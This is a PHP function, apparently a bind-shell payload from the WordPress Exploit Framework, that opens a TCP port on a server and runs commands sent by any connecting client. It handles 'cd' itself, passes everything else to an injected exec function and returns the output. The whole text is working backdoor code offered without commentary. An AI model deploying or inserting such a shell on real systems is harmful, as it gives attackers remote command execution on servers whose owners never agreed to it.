function startServer($port, $wpxf_disabled, $wpxf_exec) {
    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if ($socket === false) return;
    socket_bind($socket, 0, $port);
    socket_listen($socket, 10);

    while (true) {
        $client = socket_accept($socket);
        if ($client === false) continue;

        while (true) {
            $command = socket_read($client, 1024, PHP_NORMAL_WRITE);
            if ($command === false) break;
            $command = trim($command);
            if ($command === '') continue;

            if (strpos($command, 'cd ') === 0) {
                $dir = substr($command, 3);
                if (empty($dir)) {
                    socket_write($client, "No directory specified.\n");
                } else {
                    if (chdir($dir) === false) {
                        socket_write($client, "Directory change failed.\n");
                    } else {
                        socket_write($client, "Directory changed.\n");
                    }
                }
            } elseif ($command === 'exit' || $command === 'quit') {
                break;
            } else {
                if (in_array($command, $wpxf_disabled)) {
                    socket_write($client, "Command not allowed.\n");
                } else {
                    $output = $wpxf_exec($command);
                    socket_write($client, $output . "\n");
                }
            }

            $directory = getcwd();
            socket_write($client, $directory . "\n");
        }

        socket_close($client);
    }

    socket_close($socket);
}

